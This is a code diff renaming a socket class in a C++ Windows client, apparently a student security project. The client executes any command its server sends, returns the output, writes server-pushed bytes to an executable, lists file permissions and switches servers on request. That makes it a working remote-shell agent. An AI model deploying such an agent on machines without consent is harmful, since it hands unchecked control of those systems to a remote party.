@@ -3,7 +3,7 @@
 #include <iostream>
 #include <string>
 #include <fstream>
-#include "Socket.h"
+#include "SocketManager.h"
 #include "WindowsSocket.h"
 #include "string.h"
 #include "Aclapi.h""
@@ -19,7 +19,7 @@ std::ofstream openFile(char *file_path)
 	return f2;
 }
 
-void create_file(Socket clientSocket, SOCKET socket, char* recBuf, int iResult)
+void create_file(SocketManager socketManager, SOCKET socket, char* recBuf, int iResult)
 {
 	char * filePath = "C:\\Users\\admin\\Desktop\\CyberProject\\Client\\client_update_file.exe";
 	std::ofstream clientFile = openFile(filePath);
@@ -30,8 +30,8 @@ void create_file(Socket clientSocket, SOCKET socket, char* recBuf, int iResult)
 	{
 		//char recvbuf[DEFAULT_BUFLEN * 4] = { 0 };
 		memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
-		iResult = clientSocket.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
-		iResult2 = clientSocket.send_data(socket, "ok");
+		iResult = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
+		iResult2 = socketManager.send_data(socket, "ok");
 		if ((strcmp(recvbuf, "END_UPDATE") != 0))
 		{
 			clientFile.write(recvbuf, iResult);
@@ -66,42 +66,42 @@ std::string exec(const char* cmd)
 	_pclose(pipe);
 	return result;
 }
-void executeCommand(Socket clientSocket, SOCKET socket)
+void executeCommand(SocketManager socketManager, SOCKET socket)
 {
 	char recvbuf[DEFAULT_BUFLEN * 4];
 	int iResult, iResult2;
 	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
-	iResult = clientSocket.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
-	iResult2 = clientSocket.send_data(socket, "ok");//ok
+	iResult = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
+	iResult2 = socketManager.send_data(socket, "ok");//ok
 	std::string w = exec(recvbuf);
 	cout << w.c_str() << endl;
-	clientSocket.send_data(socket, w.c_str());
+	socketManager.send_data(socket, w.c_str());
 	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);//
-	iResult = clientSocket.receive(socket, recvbuf, 2);//ok
+	iResult = socketManager.receive(socket, recvbuf, 2);//ok
 	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
-	iResult = clientSocket.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
-	iResult2 = clientSocket.send_data(socket, "ok");
+	iResult = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
+	iResult2 = socketManager.send_data(socket, "ok");
 	if (!strcmp(recvbuf, "END_EXECUTE"))
 	{
 		cout << "end execute" << endl;
 	}
 }
 
-void dirInfo(Socket clientSocket, SOCKET socket)
+void dirInfo(SocketManager socketManager, SOCKET socket)
 {
 	//get directory size
 	int iResult, iResult2;
 	char sizeOfPacket[DEFAULT_BUFLEN];
 	memset(sizeOfPacket, 0, DEFAULT_BUFLEN);
-	iResult = clientSocket.receive(socket, sizeOfPacket, DEFAULT_BUFLEN);
-	iResult2 = clientSocket.send_data(socket, "ok");//ok
+	iResult = socketManager.receive(socket, sizeOfPacket, DEFAULT_BUFLEN);
+	iResult2 = socketManager.send_data(socket, "ok");//ok
 
 	//get directory
 	int sizePacket = atoi(sizeOfPacket);
 	char *packet = new char[sizePacket + 1];
 	memset(packet, 0, sizePacket + 1);
-	iResult = clientSocket.receive(socket, packet, sizePacket+1);
-	iResult2 = clientSocket.send_data(socket, "ok");//ok
+	iResult = socketManager.receive(socket, packet, sizePacket+1);
+	iResult2 = socketManager.send_data(socket, "ok");//ok
 
 	//char * command = "cd \"C:\\Users\\admin\\Desktop\\Analysis\" && for /f %x in ('dir /b') do icacls %x";
 	string dir = string(packet);
@@ -111,38 +111,38 @@ void dirInfo(Socket clientSocket, SOCKET socket)
 	std::string w = exec(command.c_str());
 
 	//send size
-	iResult2 = clientSocket.send_data(socket, to_string(w.length()).c_str());
+	iResult2 = socketManager.send_data(socket, to_string(w.length()).c_str());
 	char *packetOK = new char[3];
 	memset(packetOK, 0, 3);
-	iResult = clientSocket.receive(socket, packetOK, 3);//ok
+	iResult = socketManager.receive(socket, packetOK, 3);//ok
 
 	//send result
-	iResult2 = clientSocket.send_data(socket, w.c_str());
+	iResult2 = socketManager.send_data(socket, w.c_str());
 	memset(packetOK, 0, 3);
-	iResult = clientSocket.receive(socket, packetOK, 3);//ok
+	iResult = socketManager.receive(socket, packetOK, 3);//ok
 	
 }
 
-bool changeIp(Socket & clientSocket, SOCKET & socket)
+bool changeIp(SocketManager & socketManager, SOCKET & socket)
 {
 	//get size of packet
 	char sizeOfPacket[DEFAULT_BUFLEN];
 	int iResult, iResult2;
 	memset(sizeOfPacket, 0, DEFAULT_BUFLEN);
-	iResult = clientSocket.receive(socket, sizeOfPacket, DEFAULT_BUFLEN);
-	iResult2 = clientSocket.send_data(socket, "ok");//ok
+	iResult = socketManager.receive(socket, sizeOfPacket, DEFAULT_BUFLEN);
+	iResult2 = socketManager.send_data(socket, "ok");//ok
 	int sizePacket = atoi(sizeOfPacket);
 
 	//get ip:port
 	char *packet = new char[sizePacket+1];
 	memset(packet, 0, sizePacket+1);
-	iResult = clientSocket.receive(socket, packet, DEFAULT_BUFLEN);
-	iResult2 = clientSocket.send_data(socket, "ok");//ok
+	iResult = socketManager.receive(socket, packet, DEFAULT_BUFLEN);
+	iResult2 = socketManager.send_data(socket, "ok");//ok
 	char* ip = strtok(packet, ":");
 	char* port = strtok(NULL, ":");
 
 	//try to connect to 
-	Socket newClientSocket;
+	SocketManager newsocketManager;
 	//WindowsSocket windowsSocket;
 	SOCKET newSocket = INVALID_SOCKET;
 
@@ -164,22 +164,22 @@ bool changeIp(Socket & clientSocket, SOCKET & socket)
 		throw new exception("getaddrinfo failed with error: %d\n", iResult);
 	}
 
-	newClientSocket.setAddrInfo(result);
+	newsocketManager.setAddrInfo(result);
 
 	// Attempt to connect to an address until one succeeds
 	int i = 0;
 	int connectResult = SOCKET_ERROR;
 	
 	// Create a SOCKET for connecting to server
-	newSocket = newClientSocket.create();
+	newSocket = newsocketManager.create();
 	bool connected = false;
 	while (i < 3) // handle timeout!
 	{
 
 		// Connect to server.
-		connectResult = newClientSocket.conn(newSocket);
+		connectResult = newsocketManager.conn(newSocket);
 		if (connectResult == SOCKET_ERROR) {
-			newClientSocket.close(newSocket);
+			newsocketManager.close(newSocket);
 			newSocket = INVALID_SOCKET;
 			i++;
 			continue;
@@ -191,9 +191,9 @@ bool changeIp(Socket & clientSocket, SOCKET & socket)
 	freeaddrinfo(result);
 	if (connected)
 	{
-		iResult2 = clientSocket.send_data(socket, "accept");
-		clientSocket.close(socket);
-		clientSocket = newClientSocket;
+		iResult2 = socketManager.send_data(socket, "accept");
+		socketManager.close(socket);
+		socketManager = newsocketManager;
 		socket = newSocket;
 	}
 
@@ -213,7 +213,7 @@ bool changeIp(Socket & clientSocket, SOCKET & socket)
 //}
 int main(int argc, char **argv)
 {
-	Socket clientSocket;
+	SocketManager socketManager;
 	WindowsSocket windowsSocket;
 	SOCKET socket = INVALID_SOCKET;
 
@@ -238,19 +238,19 @@ int main(int argc, char **argv)
 			throw new exception("getaddrinfo failed with error: %d\n", iResult);
 		}
 
-		clientSocket.setAddrInfo(result);
+		socketManager.setAddrInfo(result);
 
 		// Attempt to connect to an address until one succeeds
 		bool connectResult = false;
 		while (true) // handle timeout!
 		{
 			// Create a SOCKET for connecting to server
-			socket = clientSocket.create();
+			socket = socketManager.create();
 
 			// Connect to server.
-			connectResult = clientSocket.conn(socket);
+			connectResult = socketManager.conn(socket);
 			if (connectResult == SOCKET_ERROR) {
-				clientSocket.close(socket);
+				socketManager.close(socket);
 				socket = INVALID_SOCKET;
 				continue;
 			}
@@ -260,7 +260,7 @@ int main(int argc, char **argv)
 		freeaddrinfo(result);
 
 		// Send an initial buffer
-		iResult = clientSocket.send_data(socket, sendbuf);
+		iResult = socketManager.send_data(socket, sendbuf);
 
 		printf("Bytes Sent: %ld\n", iResult);
 
@@ -269,8 +269,8 @@ int main(int argc, char **argv)
 			try
 			{
 				char recvbuf[DEFAULT_BUFLEN * 4] = { 0 };
-				iResult = clientSocket.receive(socket, recvbuf, recvbuflen * 4);
-				iResult2 = clientSocket.send_data(socket, "ok");
+				iResult = socketManager.receive(socket, recvbuf, recvbuflen * 4);
+				iResult2 = socketManager.send_data(socket, "ok");
 				if (iResult > 0)
 				{
 
@@ -279,33 +279,33 @@ int main(int argc, char **argv)
 
 					if (!strcmp(recvbuf, "UPDATE"))
 					{
-						create_file(clientSocket, socket, recvbuf, iResult);
+						create_file(socketManager, socket, recvbuf, iResult);
 					}
 					else if (!strcmp(recvbuf, "EXECUTE"))
 					{
-						executeCommand(clientSocket, socket);
+						executeCommand(socketManager, socket);
 					}
 					else if (!strcmp(recvbuf, "CHANGE_IP"))//2, 5
 					{
-						bool connected = changeIp(clientSocket, socket);
+						bool connected = changeIp(socketManager, socket);
 						if (connected)
 						{
-							iResult2 = clientSocket.send_data(socket, "this is a test");
+							iResult2 = socketManager.send_data(socket, "this is a test");
 
 						}
 						else
 						{
-							iResult2 = clientSocket.send_data(socket, "reject");
+							iResult2 = socketManager.send_data(socket, "reject");
 						}
 					}
 					else if (!strcmp(recvbuf, "FILE_SYSTEM_INFO"))//2, 6
 					{
-						dirInfo(clientSocket, socket);
+						dirInfo(socketManager, socket);
 					}
 					else
 					{
 						printf("Bytes received: %d\n", iResult);
-						//iResult2 = clientSocket.send_data(socket, "ok");
+						//iResult2 = socketManager.send_data(socket, "ok");
 						string buf = string(recvbuf);
 						cout << buf.substr(0, iResult);
 					}
@@ -321,7 +321,7 @@ int main(int argc, char **argv)
 
 		// cleanup
 
-		clientSocket.close(socket);
+		socketManager.close(socket);
 		windowsSocket.cleanup();
 		return 0;
 	}
